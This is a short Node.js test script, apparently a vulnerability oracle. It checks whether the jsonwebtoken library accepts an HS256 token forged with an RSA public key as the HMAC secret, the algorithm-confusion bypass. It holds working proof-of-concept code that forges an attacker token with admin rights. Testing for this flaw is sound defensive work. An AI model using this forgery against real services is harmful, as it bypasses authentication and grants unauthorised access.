const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function b64url(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

try {
  // Benign operation: standard HS256 sign/verify should work.
  const hsSecret = 'shared-secret-for-benign-flow';
  const benignPayload = { sub: 'victim-user', role: 'user' };
  const benignToken = jwt.sign(benignPayload, hsSecret, { algorithm: 'HS256' });
  const benignVerified = jwt.verify(benignToken, hsSecret, { algorithms: ['HS256'] });

  if (!benignVerified || benignVerified.sub !== 'victim-user' || benignVerified.role !== 'user') {
    throw new Error('benign verify did not return expected payload');
  }

  operation_completed = true;

  // Malicious operation: HS/RS confusion.
  // Create RSA keypair, sign attacker token with HS256 using the RSA PUBLIC key as HMAC secret,
  // then verify using that public key without explicit algorithm restrictions.
  // Vulnerable behavior accepts token; patched behavior rejects due to key type / alg checks.
  const publicKeyPem = [
    '-----BEGIN PUBLIC KEY-----',
    'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK6z8n6QjQ3h8L8x7fQeQ7wZ2mA1Yx7x',
    '0P6H2Q5w6v2N8YqJx3h2Qm0Qv4fQxM2nQ5f7X8R3kV0pZV5xKX7R1kMCAwEAAQ==',
    '-----END PUBLIC KEY-----'
  ].join('\n');

  const attackerPayload = { sub: 'attacker', admin: true };
  const forgedToken = jwt.sign(attackerPayload, publicKeyPem, { algorithm: 'HS256' });

  try {
    const out = jwt.verify(forgedToken, publicKeyPem);
    if (out && out.sub === 'attacker' && out.admin === true) {
      exploit_succeeded = true;
      evidence = 'verify accepted HS256 token signed with RSA public key material as HMAC secret';
    } else {
      exploit_succeeded = false;
      evidence = 'malicious verify returned unexpected payload';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'malicious verify rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));